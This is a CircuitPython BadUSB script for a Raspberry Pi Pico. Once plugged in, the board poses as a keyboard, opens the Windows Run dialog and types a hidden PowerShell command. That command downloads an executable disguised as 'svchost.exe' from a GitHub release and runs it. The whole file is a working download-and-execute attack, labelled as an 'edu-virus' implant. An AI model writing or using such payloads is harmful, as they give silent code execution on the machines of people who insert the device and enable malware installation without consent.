# BadUSB payload for Raspberry Pi Pico (CircuitPython)
# Plug in → auto-executes: downloads + runs edu-virus implant
#
# HOW IT WORKS:
# 1. Pico recognized as USB HID keyboard (no driver install needed)
# 2. Waits 3s for OS to register the new "keyboard"
# 3. Win+R → types PowerShell cradle → Enter
# 4. Download svchost.exe from GitHub Releases → execute

import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# === CONFIG ===
RELEASE_URL = "https://github.com/vLoon-jpg/edu-virus/releases/latest/download/svchost.exe"

PAYLOAD = (
    'powershell -WindowStyle Hidden -Command '
    '"$p=$env:TEMP\\svchost.exe;'
    'iwr -Uri \'' + RELEASE_URL + '\' -OutFile $p;'
    'Start-Process $p"'
)

WAIT_SECONDS = 3

import board
import digitalio
led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT

for _ in range(3):
    led.value = True
    time.sleep(0.1)
    led.value = False
    time.sleep(0.1)

time.sleep(WAIT_SECONDS)

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

# ATTACK: Win+R → type payload → Enter
kbd.press(Keycode.GUI, Keycode.R)
time.sleep(0.1)
kbd.release_all()
time.sleep(0.3)

layout.write(PAYLOAD)
time.sleep(0.1)

kbd.press(Keycode.ENTER)
time.sleep(0.1)
kbd.release_all()

led.value = True
while True:
    time.sleep(1)
